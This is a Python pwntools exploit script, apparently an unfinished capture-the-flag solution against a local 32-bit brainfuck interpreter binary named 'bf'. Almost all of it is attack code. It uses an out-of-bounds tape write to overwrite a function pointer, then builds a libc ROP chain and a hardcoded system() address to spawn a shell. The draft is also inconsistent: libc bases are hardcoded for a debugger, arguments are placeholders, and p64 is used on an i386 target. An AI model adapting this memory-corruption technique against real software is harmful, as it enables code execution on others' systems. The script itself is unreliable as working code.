from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

# Load executable
exe = ELF("./bf")

# Libc
libc = exe.libc
#libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb 
libc.address = libc_base
puts_addr = p32(next(libc.search(b"puts")))
#execve_addr = p32(next(libc.search(b"libc_system")))
system_addr = libc.symbols["system"]
sh_addr = system_addr + 0x120d7b
puts_addr = libc.symbols["puts"]
puts_plt = p32(exe.plt['puts'])
print(f"sh_addr: {hex(sh_addr)}")
#print(f"puts plt: {puts_plt}")

rop = ROP(libc)
rop_addr = rop.ebx.address
rop.execve(sh_addr,0,0)
#my_rop = b'p\xb3\xec\xf7baaa\n\x00\x00\x00' # sleep 10
#my_rop = b'\xc0\xb8\xec\xf7baaa+k\xf7\xf7\x10\x00\x00\x00/usr/bin/ls\x00' #ls
#0x000183a5
#my_rop = rop.ebx.address
my_rop = bytes(rop)
print(f"ROP: {bytes(rop)}")
print(f"DUMP: {rop.dump()}")
# Start process
conn = process("./bf")
#conn = gdb.debug("./bf",
#env={"LD_PRELOAD":"./libc.so.6"}, gdbscript='''
#br *0x8048717
#'''
#)

with open("payload", "w") as f:
    f.write("")
#payload = ",.,.<\nAB\n".encode() # --> should work
# 1st part - before the input - just the commands
payload = ""
#payload += "<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += "<" * 112 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += ",>,>,>," # putchar - for sending the last char
payload += "." # call to putchar()
payload += "BBBBBBBB" # call to putchar()
#payload += ".CCaC"*100 # call to puts()
#payload += "[" # call to puts()
payload +="\n"
conn.send(payload)
# 2nd part - the input to write ( the function to jump to ) 
with open("payload", "w+") as f:
    f.write(payload)
# separate sends cuz of annoying encoding / decoding issue with p32() and
# strings
#pop_eax_address = libc_base + 0x0002407e
pop_eax_address = my_rop
#print(f" POP: {hex(pop_eax_address)}")
#payload = p32(pop_eax_address) # pop eax  - I might need to call it like 0x128
#payload = bytes(my_rop)
payload = p32(0xf7e55db0) # system()
payload += p32(0x41414141) # system()
payload += p32(0x41414141) # system()
payload += p32(0x41414141) # system()
#payload += my_rop # pop eax  - I might need to call it like 0x128
payload +=b"\n"
conn.send(payload)
with open("payload", "ab+") as f:
    f.write(payload)

#payload += "AAAA"
#payload += system_addr
#payload += ".+" * 224 # print 4 characters from puts() function
#payload = payload.encode().replace('\\n','\n')
print(payload)

got_check = p64(exe.got['puts']) # the function address in GOT

print(f"got addr: {got_check}, puts: {puts_addr}")

print(conn.recvline()) # receive until newline
print(conn.recvline()) # receive until newline
output = conn.recv()
print(f"Program output: {output}") # receive until newline
#conn.recvuntil(b"result:") # receive until given keyword
#conn.send(b"-,+" + "\n" + "AB")



